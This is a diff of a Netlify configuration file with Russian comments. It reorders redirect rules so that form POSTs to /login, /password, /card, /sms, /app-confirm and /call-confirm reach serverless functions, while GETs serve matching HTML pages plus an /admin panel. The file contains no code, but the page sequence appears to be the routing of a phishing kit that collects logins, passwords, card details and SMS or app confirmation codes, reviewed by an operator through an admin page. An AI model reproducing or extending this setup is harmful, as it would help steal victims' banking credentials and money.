@@ -5,110 +5,91 @@
 [build.environment]
   NODE_VERSION = "18"
 
-[[redirects]]
-  from = "/api/*"
-  to = "/.netlify/functions/:splat"
-  status = 200
-
-# HTML files without extension - GET requests (MUST BE BEFORE POST redirects)
-[[redirects]]
-  from = "/"
-  to = "/index.html"
-  status = 200
-
-[[redirects]]
-  from = "/login"
-  to = "/index.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/password"
-  to = "/password.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/card"
-  to = "/card.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/sms"
-  to = "/sms.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/wait"
-  to = "/wait.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/app-confirm"
-  to = "/app-confirm.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/call-confirm"
-  to = "/call-confirm.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-[[redirects]]
-  from = "/admin"
-  to = "/admin.html"
-  status = 200
-  conditions = {Method = ["GET", "HEAD"]}
-
-# API endpoints - POST requests
+# POST обработчики - идут ПЕРВЫМИ чтобы перехватить POST запросы форм
 [[redirects]]
   from = "/login"
   to = "/.netlify/functions/login"
   status = 200
-  conditions = {Method = ["POST"]}
+  methods = ["POST"]
 
 [[redirects]]
   from = "/password"
   to = "/.netlify/functions/password"
   status = 200
-  conditions = {Method = ["POST"]}
+  methods = ["POST"]
 
 [[redirects]]
   from = "/card"
   to = "/.netlify/functions/card"
   status = 200
-  conditions = {Method = ["POST"]}
+  methods = ["POST"]
 
 [[redirects]]
   from = "/sms"
   to = "/.netlify/functions/sms"
   status = 200
-  conditions = {Method = ["POST"]}
+  methods = ["POST"]
 
 [[redirects]]
   from = "/app-confirm"
   to = "/.netlify/functions/app-confirm"
   status = 200
-  conditions = {Method = ["POST"]}
+  methods = ["POST"]
 
 [[redirects]]
   from = "/call-confirm"
   to = "/.netlify/functions/call-confirm"
   status = 200
-  conditions = {Method = ["POST"]}
+  methods = ["POST"]
 
 [[redirects]]
   from = "/admin/config"
   to = "/.netlify/functions/admin-config"
   status = 200
 
-# Fallback - redirect any unknown path to index.html (SPA behavior)
+# GET страницы - после POST обработчиков
+[[redirects]]
+  from = "/login"
+  to = "/index.html"
+  status = 200
+
+[[redirects]]
+  from = "/password"
+  to = "/password.html"
+  status = 200
+
+[[redirects]]
+  from = "/card"
+  to = "/card.html"
+  status = 200
+
+[[redirects]]
+  from = "/sms"
+  to = "/sms.html"
+  status = 200
+
+[[redirects]]
+  from = "/wait"
+  to = "/wait.html"
+  status = 200
+
+[[redirects]]
+  from = "/app-confirm"
+  to = "/app-confirm.html"
+  status = 200
+
+[[redirects]]
+  from = "/call-confirm"
+  to = "/call-confirm.html"
+  status = 200
+
+[[redirects]]
+  from = "/admin"
+  to = "/admin.html"
+  status = 200
+
+# Fallback для всех остальных GET запросов
 [[redirects]]
   from = "/*"
   to = "/index.html"
   status = 200
-  conditions = {Method = ["GET", "HEAD"]}
